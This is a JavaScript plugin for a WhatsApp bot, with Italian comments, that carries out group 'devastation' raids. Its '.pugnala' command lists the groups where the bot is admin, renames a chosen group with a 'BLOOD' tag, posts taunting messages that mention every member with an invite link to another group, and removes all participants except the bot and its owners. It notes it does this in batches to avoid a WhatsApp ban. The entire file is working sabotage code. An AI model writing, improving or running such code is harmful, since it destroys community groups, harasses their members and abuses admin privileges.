let handler = async (m, { conn, text, isBotAdmin, participants }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    // --- LOGICA CHAT PRIVATA ---
    if (!m.isGroup) {
        if (!text) {
            await m.reply("⏳ *Scansione gruppi in corso...*");
            
            // Recupera tutti i gruppi in cui è presente il bot
            let getGroups = await conn.groupFetchAllParticipating();
            let groups = Object.values(getGroups);
            let adminGroups = [];

            for (let g of groups) {
                try {
                    // Forza il recupero dei dati aggiornati per verificare gli admin
                    let meta = await conn.groupMetadata(g.id);
                    let bot = meta.participants.find(p => p.id === botId);
                    
                    if (bot && (bot.admin === 'admin' || bot.admin === 'superadmin')) {
                        adminGroups.push(meta);
                    }
                } catch (e) {
                    continue; // Salta se non riesce a leggere i metadati
                }
            }

            if (adminGroups.length === 0) {
                return m.reply("❌ Non ho trovato gruppi in cui sono amministratore.");
            }

            let txt = "🩸 *𝐋𝐈𝐒𝐓𝐀 𝐁𝐄𝐑𝐒𝐀𝐆𝐋𝐈 𝐁𝐋𝐎𝐎𝐃* 🩸\n\n";
            txt += "Copia l'ID e usa: `.pugnala <ID>` per svuotarlo.\n\n";
            
            adminGroups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\nID: \`${g.id}\`\n\n`;
            });

            return m.reply(txt);
        }

        // Se l'utente invia l'ID (es. .pugnala 12345@g.us)
        let targetGroup = text.trim();
        if (!targetGroup.endsWith('@g.us')) return m.reply("❌ L'ID deve terminare con `@g.us`.");

        try {
            let meta = await conn.groupMetadata(targetGroup);
            let botInTarget = meta.participants.find(p => p.id === botId);
            
            if (!botInTarget || !botInTarget.admin) {
                return m.reply("❌ In quel gruppo non sono admin, non posso agire.");
            }

            await m.reply(`⚔️ Inizio devastazione in: *${meta.subject}*...`);
            await executeDevasto(conn, targetGroup, meta.participants, botId, ownerJids);
            return m.reply("✅ Operazione completata.");
        } catch (e) {
            return m.reply("❌ Errore: ID non trovato o bot rimosso dal gruppo.");
        }
    }

    // --- LOGICA SE USATO DIRETTAMENTE IN GRUPPO ---
    if (!isBotAdmin) return m.reply("❌ Devo essere admin per colpire.");
    await executeDevasto(conn, m.chat, participants, botId, ownerJids);
};

// Funzione universale per il devasto
async function executeDevasto(conn, chatId, participants, botId, ownerJids) {
    try {
        // 1. Cambio Nome
        let meta = await conn.groupMetadata(chatId);
        await conn.groupUpdateSubject(chatId, `${meta.subject} | 𝚂𝚅𝚃 𝙱𝚢  𝐁𝐋𝐎𝐎𝐃`);

        // 2. Filtro utenti (esclude bot e owner)
        let usersToRemove = participants
            .map(p => p.id || p.jid)
            .filter(jid => jid && jid !== botId && !ownerJids.includes(jid));

        let allJids = participants.map(p => p.id || p.jid);

        // 3. Messaggi di annuncio
        await conn.sendMessage(chatId, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎."
        });

        await conn.sendMessage(chatId, {
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐯𝐢 𝐚𝐬𝐩𝐞𝐭𝐭𝐢𝐚𝐦𝐨 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐚:\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: allJids
        });

        // 4. Rimozione partecipanti a blocchi (per evitare ban da WhatsApp)
        for (let user of usersToRemove) {
            await conn.groupParticipantsUpdate(chatId, [user], 'remove');
            // Piccolo delay opzionale per stabilità:
            // await new Promise(resolve => setTimeout(resolve, 500)); 
        }
    } catch (e) {
        console.error('Errore durante l\'esecuzione:', e);
    }
}

handler.command = ['pugnala'];
handler.owner = true;

export default handler;
